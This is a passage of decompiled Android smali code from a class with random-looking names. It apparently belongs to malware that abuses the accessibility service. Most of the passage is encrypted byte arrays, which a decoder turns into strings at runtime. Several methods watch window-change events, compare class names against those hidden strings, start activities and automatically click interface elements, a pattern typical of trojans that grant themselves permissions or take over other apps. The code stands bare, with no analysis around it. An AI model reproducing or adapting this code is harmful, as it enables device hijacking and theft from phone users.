        -0x7at
        0x3bt
        -0x7dt
        0x55t
        -0x54t
        0x21t
        0x53t
        -0x49t
        -0x32t
        0xdt
        -0x6dt
        0x1bt
        -0x5at
        0x22t
        0x60t
        -0x4bt
        -0x23t
        0x20t
        -0x74t
    .end array-data

    :array_11
    .array-data 1
        -0x44t
        0x52t
        -0x19t
        0x7at
        -0x31t
        0x4et
        0x3ft
        -0x28t
    .end array-data

    :array_12
    .array-data 1
        -0x7et
        -0x2ct
        0x20t
        0x65t
        -0x70t
        0x59t
        -0x3ct
        -0x12t
        -0x6dt
        -0x2ct
        0x3et
        0x65t
        -0x64t
        0x46t
        -0x28t
        -0x12t
        -0x7at
        -0x32t
        0x2ct
        0x39t
        -0x69t
        0x53t
        -0x3ct
        -0x19t
        -0x25t
        -0x2et
        0x29t
        0x64t
        -0x70t
        0x59t
        -0x3ct
        -0x12t
        -0x6dt
        -0x1ct
        0x39t
        0x2at
        -0x66t
        0x5at
        -0x9t
        -0x14t
        -0x80t
        -0x37t
        0x26t
    .end array-data

    :array_13
    .array-data 1
        -0x1ft
        -0x45t
        0x4dt
        0x4bt
        -0xdt
        0x36t
        -0x58t
        -0x7ft
    .end array-data

    :array_14
    .array-data 1
        0x32t
        0x22t
        -0x1ft
        0x7et
        -0x12t
        0x49t
        0x3t
        -0x7t
        0x22t
        0x63t
        -0x12t
        0x31t
        -0xbt
        0x4dt
        0xat
        -0x2t
        0x28t
        0x77t
        -0x1bt
        0x34t
        -0x52t
        0x5at
        0x0t
        -0x7t
        0x38t
        0x12t
        -0x8t
        0x31t
        -0x18t
        0x55t
        0x30t
        -0x1ft
        0x30t
        0x3ft
        -0x19t
    .end array-data

    :array_15
    .array-data 1
        0x51t
        0x4dt
        -0x74t
        0x50t
        -0x7ft
        0x39t
        0x6ft
        -0x74t
    .end array-data

    :array_16
    .array-data 1
        0x46t
        0x23t
        0xdt
        0x47t
        -0x4dt
        0x49t
        0x4dt
        0x2ct
        0x56t
        0x62t
        0x2t
        0x8t
        -0x58t
        0x4dt
        0x44t
        0x2bt
        0x5ct
        0x76t
        0x9t
        0xdt
        -0xdt
        0x5at
        0x4et
        0x2ct
        0x4ct
        0x13t
        0x10t
        0x1bt
        -0x47t
        0x5ft
        0x44t
        0x2bt
        0x40t
        0x22t
        0x3t
        0xct
        -0x7dt
        0x4et
        0x48t
        0x3dt
        0x42t
        0x29t
        0x14t
        0x36t
        -0x4at
        0x4ct
        0x4ct
        0x29t
    .end array-data

    :array_17
    .array-data 1
        0x25t
        0x4ct
        0x60t
        0x69t
        -0x24t
        0x39t
        0x21t
        0x59t
    .end array-data

    :array_18
    .array-data 1
        0x18t
        -0x5bt
        0x48t
        -0x3ft
        0x1bt
        -0x8t
        0x61t
        0x60t
        0x9t
        -0x5bt
        0x56t
        -0x3ft
        0x17t
        -0x19t
        0x7dt
        0x60t
        0x1ct
        -0x41t
        0x44t
        -0x63t
        0x1ct
        -0xet
        0x61t
        0x69t
        0x41t
        -0x5dt
        0x41t
        -0x40t
        0x1bt
        -0x8t
        0x61t
        0x60t
        0x9t
        -0x6bt
        0x55t
        -0x63t
        0x1dt
        -0xft
        0x68t
        0x7dt
        0x1et
        -0x5ct
        0x46t
        -0x76t
        0x27t
        -0x20t
        0x64t
        0x6bt
        0x1ct
        -0x51t
        0x51t
        -0x50t
        0x12t
        -0x1et
        0x60t
        0x7ft
    .end array-data

    :array_19
    .array-data 1
        0x7bt
        -0x36t
        0x25t
        -0x11t
        0x78t
        -0x69t
        0xdt
        0xft
    .end array-data
.end method

.method private static synthetic F2(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->T0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    return-void
.end method

.method public static synthetic G()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->M2()V

    return-void
.end method

.method private static G0(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 7

    .line 1
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w:Z

    const/4 v1, 0x1

    const/16 v2, 0x8

    const/16 v3, 0x20

    const/4 v4, 0x0

    if-nez v0, :cond_2

    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->e:Z

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v5

    if-ne v5, v3, :cond_0

    move v5, v1

    goto :goto_0

    :cond_0
    move v5, v4

    :goto_0
    and-int/2addr v0, v5

    if-eqz v0, :cond_2

    const/16 v0, 0x36

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    new-array v5, v2, [B

    fill-array-data v5, :array_1

    invoke-static {v0, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const/16 v0, 0x40

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v5, v2, [B

    fill-array-data v5, :array_3

    invoke-static {v0, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    :cond_1
    sput-boolean v4, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->e:Z

    const/16 v0, 0x3e8

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    new-instance v0, Ljava/lang/Thread;

    new-instance v5, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$m;

    invoke-direct {v5}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$m;-><init>()V

    invoke-direct {v0, v5}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_2
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w:Z

    if-nez v0, :cond_4

    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f:Z

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v5

    if-ne v5, v3, :cond_3

    move v5, v1

    goto :goto_1

    :cond_3
    move v5, v4

    :goto_1
    and-int/2addr v0, v5

    if-eqz v0, :cond_4

    const/16 v0, 0x30

    new-array v0, v0, [B

    fill-array-data v0, :array_4

    new-array v5, v2, [B

    fill-array-data v5, :array_5

    invoke-static {v0, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_5

    :cond_4
    const/16 v0, 0x2f

    new-array v0, v0, [B

    fill-array-data v0, :array_6

    new-array v5, v2, [B

    fill-array-data v5, :array_7

    invoke-static {v0, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    :cond_5
    sput-boolean v4, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f:Z

    const/16 v0, 0xc8

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    new-instance v0, Ljava/lang/Thread;

    new-instance v5, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$n;

    invoke-direct {v5}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$n;-><init>()V

    invoke-direct {v0, v5}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_6
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w:Z

    const/16 v5, 0x9c4

    if-nez v0, :cond_8

    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g:Z

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v6

    if-ne v6, v3, :cond_7

    move v6, v1

    goto :goto_2

    :cond_7
    move v6, v4

    :goto_2
    and-int/2addr v0, v6

    if-eqz v0, :cond_8

    const/16 v0, 0x43

    new-array v0, v0, [B

    fill-array-data v0, :array_8

    new-array v6, v2, [B

    fill-array-data v6, :array_9

    invoke-static {v0, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    move-result-object v6

    invoke-virtual {v0, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_8

    sput-boolean v4, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g:Z

    invoke-static {v5}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    new-instance v0, Ljava/lang/Thread;

    new-instance v5, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$o;

    invoke-direct {v5}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$o;-><init>()V

    invoke-direct {v0, v5}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    :goto_3
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    goto :goto_4

    :cond_8
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w:Z

    if-nez v0, :cond_9

    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g:Z

    if-eqz v0, :cond_9

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    if-ne v0, v3, :cond_9

    sput-boolean v4, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g:Z

    invoke-static {v5}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    new-instance v0, Ljava/lang/Thread;

    new-instance v5, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$p;

    invoke-direct {v5}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$p;-><init>()V

    invoke-direct {v0, v5}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    goto :goto_3

    :cond_9
    :goto_4
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w:Z

    if-nez v0, :cond_b

    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->h:Z

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v5

    if-ne v5, v3, :cond_a

    move v5, v1

    goto :goto_5

    :cond_a
    move v5, v4

    :goto_5
    and-int/2addr v0, v5

    if-eqz v0, :cond_b

    const/16 v0, 0x47

    new-array v0, v0, [B

    fill-array-data v0, :array_a

    new-array v2, v2, [B

    fill-array-data v2, :array_b

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_b

    sput-boolean v4, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->h:Z

    new-instance p0, Ljava/lang/Thread;

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$q;

    invoke-direct {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$q;-><init>()V

    invoke-direct {p0, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    :goto_6
    invoke-virtual {p0}, Ljava/lang/Thread;->start()V

    goto :goto_8

    :cond_b
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w:Z

    if-nez v0, :cond_d

    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->h:Z

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result p0

    if-ne p0, v3, :cond_c

    goto :goto_7

    :cond_c
    move v1, v4

    :goto_7
    and-int p0, v0, v1

    if-eqz p0, :cond_d

    sput-boolean v4, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->h:Z

    new-instance p0, Ljava/lang/Thread;

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$r;

    invoke-direct {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$r;-><init>()V

    invoke-direct {p0, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    goto :goto_6

    :cond_d
    :goto_8
    return-void

    nop

    :array_0
    .array-data 1
        0x47t
        -0x1bt
        0x58t
        -0x5t
        -0x7ft
        0x6t
        0x3at
        0x1bt
        0xat
        -0x6t
        0x50t
        -0x59t
        -0x66t
        0x6t
        0x3ft
        0x7t
        0x4dt
        -0x1bt
        0x5bt
        -0x48t
        -0x6at
        0x1t
        0x2dt
        0x13t
        0x41t
        -0x8t
        0x1bt
        -0x4ct
        -0x6ct
        0x1bt
        0x25t
        0x2t
        0x4dt
        -0x2t
        0x4ct
        -0x5t
        -0x59t
        0x1at
        0x3et
        0x2t
        0x4dt
        -0x11t
        0x42t
        -0x7ft
        -0x6at
        0xdt
        0xdt
        0x17t
        0x50t
        -0x1dt
        0x43t
        -0x44t
        -0x7dt
        0x16t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x24t
        -0x76t
        0x35t
        -0x2bt
        -0x9t
        0x6ft
        0x4ct
        0x74t
    .end array-data

    :array_2
    .array-data 1
        0x31t
        -0x23t
        0x75t
        -0x6at
        0x50t
        -0x29t
        -0x52t
        0x7ft
        0x7ct
        -0x3et
        0x7dt
        -0x36t
        0x4bt
        -0x29t
        -0x55t
        0x63t
        0x3bt
        -0x23t
        0x76t
        -0x2bt
        0x47t
        -0x30t
        -0x47t
        0x77t
        0x37t
        -0x40t
        0x36t
        -0x27t
        0x45t
        -0x36t
        -0x4ft
        0x66t
        0x3bt
        -0x3at
        0x61t
        -0x6at
        0x75t
        -0x2ft
        -0x42t
        0x64t
        0x2t
        -0x29t
        0x6at
        -0x2bt
        0x4ft
        -0x33t
        -0x55t
        0x79t
        0x3dt
        -0x24t
        0x5ct
        -0x23t
        0x52t
        -0x21t
        -0x4ft
        0x7ct
        0x13t
        -0x2ft
        0x6ct
        -0x2ft
        0x50t
        -0x29t
        -0x54t
        0x69t
    .end array-data

    :array_3
    .array-data 1
        0x52t
        -0x4et
        0x18t
        -0x48t
        0x26t
        -0x42t
        -0x28t
        0x10t
    .end array-data

    :array_4
    .array-data 1
        0x34t
        0x6dt
        -0x55t
        -0x35t
        -0x4bt
        -0x16t
        0x7ct
        -0x61t
        0x79t
        0x72t
        -0x57t
        -0x6et
        -0x47t
        -0x17t
        0x60t
        -0x6ft
        0x21t
        0x6bt
        -0x58t
        -0x7et
        -0xet
        -0x3t
        0x66t
        -0x6bt
        0x3bt
        0x65t
        -0x59t
        -0x70t
        -0x45t
        -0x2t
        0x3dt
        -0x60t
        0x38t
        0x75t
        -0x5dt
        -0x69t
        -0x72t
        -0x6t
        0x7dt
        -0x65t
        0x16t
        0x61t
        -0x4et
        -0x74t
        -0x56t
        -0xet
        0x67t
        -0x77t
    .end array-data

    :array_5
    .array-data 1
        0x57t
        0x2t
        -0x3at
        -0x1bt
        -0x24t
        -0x65t
        0x13t
        -0x10t
    .end array-data

    :array_6
    .array-data 1
        -0xat
        -0x12t
        -0x6ft
        0x4ct
        -0x29t
        0x4et
        0x45t
        -0x17t
        -0x45t
        -0xft
        -0x6dt
        0x15t
        -0x25t
        0x4dt
        0x59t
        -0x19t
        -0x1dt
        -0x18t
        -0x6et
        0x5t
        -0x70t
        0x6ft
        0x45t
        -0xft
        -0x10t
        -0xdt
        -0x51t
        0x3t
        -0x38t
        0x56t
        0x44t
        -0x1ft
        -0x28t
        -0x20t
        -0x6et
        0x3t
        -0x27t
        0x5at
        0x58t
        -0x39t
        -0xat
        -0xbt
        -0x6bt
        0x14t
        -0x29t
        0x4bt
        0x53t
    .end array-data

    :array_7
    .array-data 1
        -0x6bt
        -0x7ft
        -0x4t
        0x62t
        -0x42t
        0x3ft
        0x2at
        -0x7at
    .end array-data

    :array_8
    .array-data 1
        0x65t
        0x74t
        -0x6at
        0x3ct
        -0x47t
        0x12t
        -0xft
        -0xdt
        0x28t
        0x7at
        -0x75t
        0x62t
        -0x5dt
        0x12t
        -0x1ct
        -0x3t
        0x72t
        0x72t
        -0x6ct
        0x7ct
        -0x53t
        0x1et
        -0x11t
        -0x3t
        0x70t
        0x72t
        -0x6ct
        0x60t
        -0x56t
        0x15t
        -0x20t
        -0xbt
        0x68t
        0x7et
        -0x2bt
        0x67t
        -0x5at
        0x55t
        -0x3et
        -0x1ct
        0x65t
        0x7et
        -0x78t
        0x61t
        -0x5at
        0xdt
        -0x1et
        -0x34t
        0x69t
        0x6ct
        -0x62t
        0x60t
        -0x7et
        0x1at
        -0x17t
        -0x3t
        0x61t
        0x7et
        -0x77t
        0x53t
        -0x54t
        0xft
        -0x12t
        -0x16t
        0x6ft
        0x6ft
        -0x7et
    .end array-data

    :array_9
    .array-data 1
        0x6t
        0x1bt
        -0x5t
        0x12t
        -0x31t
        0x7bt
        -0x79t
        -0x64t
    .end array-data

    :array_a
    .array-data 1
        -0x26t
        -0x17t
        0xct
        -0x4t
        0x7bt
        -0x34t
        -0x33t
        -0x74t
        -0x69t
        -0x19t
        0x11t
        -0x5et
        0x61t
        -0x34t
        -0x28t
        -0x7et
        -0x33t
        -0x11t
        0xet
        -0x44t
        0x6ft
        -0x40t
        -0x2dt
        -0x7et
        -0x31t
        -0x11t
        0xet
        -0x60t
        0x68t
        -0x35t
        -0x24t
        -0x76t
        -0x29t
        -0x1dt
        0x4ft
        -0x59t
        0x64t
        -0x75t
        -0x2t
        -0x65t
        -0x26t
        -0x1dt
        0x12t
        -0x5ft
        0x64t
        -0x2dt
        -0x22t
        -0x4dt
        -0x2at
        -0xft
        0x4t
        -0x60t
        0x49t
        -0x40t
        -0x38t
        -0x80t
        -0x35t
        -0x11t
        0x11t
        -0x5at
        0x64t
        -0x36t
        -0x2bt
        -0x5et
        -0x26t
        -0xet
        0x8t
        -0x5ct
        0x64t
        -0x2ft
        -0x3et
    .end array-data

    :array_b
    .array-data 1
        -0x47t
        -0x7at
        0x61t
        -0x2et
        0xdt
        -0x5bt
        -0x45t
        -0x1dt
    .end array-data
.end method

.method private static G1()V
    .locals 1

    .line 1
    const/4 v0, 0x1

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->n:Z

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->H1()V

    const/16 v0, 0x1f4

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    const/4 v0, 0x5

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->D1(I)V

    return-void
.end method

.method private static synthetic G2()V
    .locals 1

    .line 1
    const/16 v0, 0xbb8

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    const/4 v0, 0x5

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->e3(I)V

    return-void
.end method

.method public static synthetic H(Landroid/content/Context;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->y2(Landroid/content/Context;)V

    return-void
.end method

.method private static H0(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 2

    .line 1
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w:Z

    if-nez v0, :cond_0

    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->q:Z

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const/16 v1, 0x20

    if-ne v0, v1, :cond_0

    const/16 v0, 0x2f

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    move-result-object p0

    invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_0

    const/4 p0, 0x0

    sput-boolean p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->q:Z

    const/16 p0, 0xc8

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->V0()V

    :cond_0
    return-void

    :array_0
    .array-data 1
        0x63t
        -0x2dt
        0x17t
        -0x67t
        -0x46t
        0x48t
        0x8t
        0x23t
        0x2et
        -0x23t
        0xat
        -0x39t
        -0x46t
        0x40t
        0x13t
        0x2bt
        0x67t
        -0x27t
        0x8t
        -0x67t
        -0x6at
        0x51t
        0xdt
        0x26t
        0x69t
        -0x21t
        0x1bt
        -0x3dt
        -0x42t
        0x4et
        0x13t
        0x39t
        0x44t
        -0x27t
        0xet
        -0x2at
        -0x42t
        0x4dt
        0xet
        0xbt
        0x63t
        -0x38t
        0x13t
        -0x3ft
        -0x42t
        0x55t
        0x4t
    .end array-data

    :array_1
    .array-data 1
        0x0t
        -0x44t
        0x7at
        -0x49t
        -0x29t
        0x21t
        0x7dt
        0x4at
    .end array-data
.end method

.method private static H1()V
    .locals 3

    .line 1
    new-instance v0, Landroid/content/Intent;

    const/16 v1, 0x19

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void

    :array_0
    .array-data 1
        -0x5t
        -0x2ft
        -0x60t
        -0x34t
        -0x38t
        -0x34t
        -0x61t
        0x4ct
        -0x17t
        -0x26t
        -0x50t
        -0x36t
        -0x32t
        -0x35t
        -0x64t
        0x11t
        -0x4ct
        -0x14t
        -0x7ft
        -0x16t
        -0xdt
        -0x14t
        -0x4bt
        0x25t
        -0x37t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x66t
        -0x41t
        -0x3ct
        -0x42t
        -0x59t
        -0x5bt
        -0x5t
        0x62t
    .end array-data
.end method

.method private static synthetic H2()V
    .locals 4

    .line 1
    const/16 v0, 0x3e8

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v2, 0x18

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v3, v3, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->T0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->w(Landroid/accessibilityservice/AccessibilityService;)V

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    sget-object v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/qq;->e:Ljava/lang/String;

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->c(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/wy;

    invoke-direct {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/wy;-><init>()V

    invoke-static {v0, v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    goto :goto_0

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->Z2()V

    :goto_0
    return-void

    nop

    :array_0
    .array-data 1
        0x68t
        -0x3ft
        0x50t
        0x6et
        0xdt
        -0x66t
        -0x6at
        0x61t
        0x60t
        -0x35t
        0x1bt
        0x6ft
        0x15t
        -0x66t
        -0x7at
        0x38t
        0x61t
        -0x10t
        0x43t
        0x75t
        0x6t
        -0x6ct
        -0x69t
        0x2ft
    .end array-data

    :array_1
    .array-data 1
        0x9t
        -0x51t
        0x34t
        0x1ct
        0x62t
        -0xdt
        -0xet
        0x5bt
    .end array-data
.end method

.method public static synthetic I()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->N2()V

    return-void
.end method

.method private static I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 1

    .line 1
    if-eqz p0, :cond_0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v0

    if-eqz v0, :cond_0

    const/16 v0, 0x10

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

